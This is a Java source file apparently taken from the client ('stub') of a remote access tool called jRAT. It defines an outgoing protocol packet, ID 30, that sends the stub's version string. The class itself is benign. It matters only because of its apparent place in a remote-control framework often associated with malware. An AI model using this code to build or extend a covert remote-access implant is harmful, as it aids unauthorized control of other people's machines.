package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;


public class Packet30InitVersion extends AbstractOutgoingPacket {

	private String version;
	
	public Packet30InitVersion(String version) {
		this.version = version;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(version);
	}

	@Override
	public byte getPacketId() {
		return (byte) 30;
	}

}